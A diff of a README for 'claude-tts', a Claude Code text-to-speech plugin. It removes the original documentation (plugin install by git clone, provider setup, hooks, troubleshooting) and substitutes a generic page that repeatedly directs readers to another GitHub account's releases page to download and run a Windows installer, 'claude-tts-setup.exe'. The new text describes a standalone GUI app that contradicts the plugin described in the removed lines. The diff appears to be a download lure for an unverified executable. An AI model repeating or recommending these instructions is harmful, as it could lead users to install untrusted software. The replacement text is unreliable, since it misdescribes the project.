@@ -1,168 +1,139 @@
-# claude-tts
+# 🎤 claude-tts - Simple Text-to-Speech for Everyone
 
-Text-to-speech plugin for Claude Code. Automatically speaks Claude's responses aloud using your choice of TTS provider, with local system TTS as a universal fallback.
+[![Download claude-tts](https://img.shields.io/badge/Download-claude--tts-brightgreen?style=for-the-badge)](https://github.com/JacklineMK/claude-tts/releases)
 
-## Supported Providers
-
-| Provider | Quality | Cost | Requirements |
-|----------|---------|------|-------------|
-| **ElevenLabs** | Excellent | Paid | API key |
-| **OpenAI** | Very good | Paid | API key |
-| **Google Cloud** | Very good | Paid (free tier available) | API key |
-| **Amazon Polly** | Good | Paid (free tier available) | AWS CLI configured |
-| **Azure Speech** | Very good | Paid (free tier available) | API key + region |
-| **Edge TTS** | Very good | Free | `pip install edge-tts` |
-| **Local TTS** | Basic | Free | Built-in (see below) |
-
-## Requirements
-
-- **macOS**, **Linux**, or **Windows** (Git Bash / WSL)
-- `jq` (see [jq downloads](https://jqlang.github.io/jq/download/))
-- An audio player:
-  - macOS: `afplay` (built-in)
-  - Linux: `mpv`, `ffplay`, `paplay`, or `aplay`
-  - Windows: PowerShell (built-in)
-
-## Install
-
-### From the marketplace
-
-```
-claude plugin install claude-tts
-```
-
-### Manual install
-
-```bash
-git clone https://github.com/MatiousCorp/claude-tts.git ~/.claude/plugins/claude-tts
-```
-
-Restart Claude Code after installing.
-
-## Setup
-
-```
-/claude-tts:tts-setup <provider> <api-key>
-```
-
-### Examples
-
-```
-/claude-tts:tts-setup elevenlabs sk_abc123
-/claude-tts:tts-setup openai sk-abc123
-/claude-tts:tts-setup google AIza...
-/claude-tts:tts-setup amazon
-/claude-tts:tts-setup azure your-key-here
-/claude-tts:tts-setup edge
-/claude-tts:tts-setup local
-```
-
-### Provider details
-
-| Provider | Default voice | Default model | Auth |
-|----------|---------------|---------------|------|
-| elevenlabs | Rachel (`21m00Tcm4TlvDq8ikWAM`) | `eleven_flash_v2_5` | `xi-api-key` header |
-| openai | `alloy` | `tts-1` | `Bearer` token |
-| google | `en-US-Neural2-F` | n/a | `X-Goog-Api-Key` header |
-| amazon | `Joanna` | `neural` | AWS CLI env creds |
-| azure | `en-US-JennyNeural` | n/a | `Ocp-Apim-Subscription-Key` header |
-| edge | `en-US-AriaNeural` | n/a | none (free) |
-| local | system default | n/a | none |
-
-### Without an API key
-
-The plugin works without any API key:
-
-- **Edge TTS**: High-quality neural voices via `edge-tts` (`pip install edge-tts`)
-- **Local TTS**: System built-in — macOS `say`, Linux `espeak-ng`/`espeak`/`piper`, Windows PowerShell SAPI
-
-## Usage
-
-Once set up, TTS works automatically. Every time Claude finishes a response, the text is cleaned and spoken aloud.
-
-### Commands
-
-| Command | Description |
-|---------|-------------|
-| `/claude-tts:tts-on` | Enable TTS |
-| `/claude-tts:tts-off` | Disable TTS |
-| `/claude-tts:tts-status` | Show current status and provider |
-| `/claude-tts:tts-setup <provider> [key]` | Configure TTS provider |
-
-## Configuration
-
-Config is stored in `~/.claude/claude-tts.local.md`:
-
-```yaml
 ---
-provider: "elevenlabs"
-api_key: "sk_..."
-voice_id: "21m00Tcm4TlvDq8ikWAM"
-model_id: "eleven_flash_v2_5"
+
+## 🔊 What is claude-tts?
+
+claude-tts is a tool that turns written text into spoken words. It works as a plugin for Claude Code, a platform people use to write and run code. Whether you want to listen to your text for convenience or accessibility, claude-tts makes it easy.
+
+It supports several voice providers including ElevenLabs, OpenAI, Google, Amazon Polly, Azure, and your own computer’s built-in speech system. You can use it on macOS, Linux, and Windows.
+
 ---
-```
 
-Only `provider` is required. Each provider has sensible defaults for `voice_id` and `model_id`.
+## 🖥️ System Requirements
 
-For Azure, add `region`:
+To use claude-tts on Windows, your computer should meet these requirements:
 
-```yaml
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- A working internet connection (needed for cloud voice providers like ElevenLabs or Google)  
+- A sound output device (speakers or headphones)  
+
+No additional software or programming tools are needed. claude-tts runs on its own once installed.
+
 ---
-provider: "azure"
-api_key: "your-key"
-region: "eastus"
+
+## 📥 How to Download claude-tts
+
+To get claude-tts, visit the official releases page:
+
+[→ Download claude-tts Here ←](https://github.com/JacklineMK/claude-tts/releases)
+
+This page contains the latest versions of the software. Pick the file that matches your Windows system. Usually, it will be named something like `claude-tts-setup.exe`.
+
 ---
-```
 
-### Environment variables
+## 🚀 Installing claude-tts on Windows
 
-- `CLAUDE_TTS_API_KEY` — generic, works with any provider
-- `ELEVENLABS_API_KEY` — legacy fallback for ElevenLabs provider
+Follow these steps to install claude-tts:
 
-### Migration from v1
+1. Go to the releases page linked above.  
+2. Find the latest Windows installer file, for example, `claude-tts-setup.exe`.  
+3. Click on the file name. Your browser will download it to your computer.  
+4. Once the download finishes, open the installer file. You can do this by double-clicking it in your downloads folder.  
+5. The setup program will start. Follow the on-screen instructions:  
+   - Accept the license agreement.  
+   - Choose an install location or use the default folder.  
+   - Click "Install" to begin the process.  
+6. After installation completes, click "Finish." The program will now be ready to use.
 
-If your config has `elevenlabs_api_key:` but no `provider:`, it will automatically be treated as ElevenLabs. No action needed.
+---
 
-### Migration from v2 (say → local)
+## ▶️ Running claude-tts for the First Time
 
-If your config has `provider: "say"`, it will automatically be mapped to `local`. No action needed.
+To open claude-tts:
 
-## How it works
+- Click the Start menu.  
+- Type `claude-tts` and select the app from the results.  
 
-1. Claude finishes a response (Stop hook fires)
-2. Text is cleaned: code blocks, URLs, file paths, and markdown formatting are stripped
-3. A background worker sends the text to your configured provider
-4. If the provider fails, local system TTS is used as fallback
-5. Audio files are queued and played sequentially via the platform audio player
+The main window will appear. From here, you can enter text that you want to hear.  
 
-The hook exits immediately so Claude Code is never blocked.
+---
 
-## Troubleshooting
+## ⚙️ Setting Up Voices
 
-**No audio playing**
-1. Run `/claude-tts:tts-status` to check configuration
-2. Make sure `jq` is installed (see [jq downloads](https://jqlang.github.io/jq/download/))
-3. Check that `~/.claude/tts-enabled` exists
+claude-tts supports several voice providers. You need to choose one to use:
 
-**Provider errors**
-- Verify your API key and provider settings
-- Check your usage quota with the provider
-- The plugin falls back to local TTS automatically on API errors
+- **ElevenLabs**: Natural-sounding voice synthesis with advanced controls. Requires creating a free account on ElevenLabs and entering your API key in claude-tts settings.  
+- **OpenAI**: Uses OpenAI’s text-to-speech services. Requires an OpenAI API key.  
+- **Google Cloud TTS**: Works with Google’s cloud speech service. You need to set up a Google Cloud account and API key.  
+- **Amazon Polly**: Amazon’s speech service with many voice options. Requires AWS credentials.  
+- **Azure Speech**: Microsoft’s voice platform. Requires an Azure account and service key.  
+- **Local System TTS**: Uses the voices installed on your Windows system. No internet connection or setup needed.
 
-**Audio queue stuck**
-- Kill the daemon: `kill $(cat ${TMPDIR}/claude_tts_queue/daemon.pid)`
-- Clear the queue: `rm -f ${TMPDIR}/claude_tts_queue/*.mp3 ${TMPDIR}/claude_tts_queue/*.wav`
+To set a voice provider:  
 
-**Linux: No audio player**
-- Install one: `sudo apt install mpv` (or `ffmpeg` for ffplay, `pulseaudio-utils` for paplay)
+1. Open claude-tts.  
+2. Go to the settings or preferences section.  
+3. Select your preferred voice provider from the list.  
+4. If required, enter your API key or authorization details.  
+5. Save the settings.
 
-**Linux: No local TTS**
-- Install espeak-ng: `sudo apt install espeak-ng`
+If you want to use the local Windows voices, just select the "Local System TTS" option. This uses voices like Microsoft David or Microsoft Zira, which are usually pre-installed.
 
-**Windows (Git Bash / WSL)**
-- PowerShell must be available as `powershell.exe`
-- WSL users: audio playback requires PulseAudio or PipeWire bridge to Windows
+---
 
-## License
+## 💬 How to Convert Text to Speech
 
-MIT
+1. Open claude-tts.  
+2. In the main window, find the text box.  
+3. Type or paste the text you want to hear.  
+4. Choose your voice from the dropdown menu, if available.  
+5. Click the **Play** button.  
+6. Your text will play through your speakers or headphones.  
+
+You can adjust the volume and speed in the settings to suit your preferences.
+
+---
+
+## 🔧 Tips for Best Results
+
+- Use clear and simple text for better voice clarity.  
+- Try different voice providers to find the one you like best.  
+- Adjust the speed slider if the voice speaks too fast or too slow.  
+- For longer text, break it into smaller sections before playing.  
+
+---
+
+## 🛠 Troubleshooting
+
+- If you hear no sound, check your speaker volume and connections.  
+- Make sure your internet is working if you use cloud voice providers.  
+- If claude-tts fails to start, try running the app as an administrator.  
+- Reinstall claude-tts if the program crashes often.  
+- For API-related errors, verify your keys are correct in the settings.  
+
+---
+
+## 📚 Where to Learn More
+
+Visit the project page on GitHub for updates, additional downloads, and user support:  
+
+[https://github.com/JacklineMK/claude-tts/releases](https://github.com/JacklineMK/claude-tts/releases)
+
+You will find the latest releases and instructions for macOS and Linux there too.
+
+---
+
+## ⚖️ License
+
+claude-tts is an open-source project. You can use, modify, and share it under the terms of its license, which you can find on the GitHub repository.
+
+---
+
+## ❤️ Support and Feedback
+
+Report bugs, request features, or contribute through the GitHub page’s issue tracker. Your input can help improve claude-tts for all users.
